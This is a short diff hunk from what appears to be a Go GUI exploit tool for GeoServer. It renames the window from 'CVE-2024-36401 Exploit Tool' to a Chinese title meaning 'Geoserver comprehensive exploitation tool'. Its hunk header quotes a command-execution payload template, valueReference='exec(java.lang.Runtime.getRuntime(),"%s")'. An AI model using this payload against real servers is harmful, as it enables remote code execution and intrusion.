@@ -381,7 +381,7 @@ valueReference='exec(java.lang.Runtime.getRuntime(),"%s")'>
 func main() {
 	// 初始化Fyne应用
 	myApp := app.NewWithID("GUI-EXP")
-	myWindow := myApp.NewWindow("CVE-2024-36401 Exploit Tool")
+	myWindow := myApp.NewWindow("Geoserver综合利用工具")
 
 	// 创建输入框
 	urlEntry := widget.NewEntry()
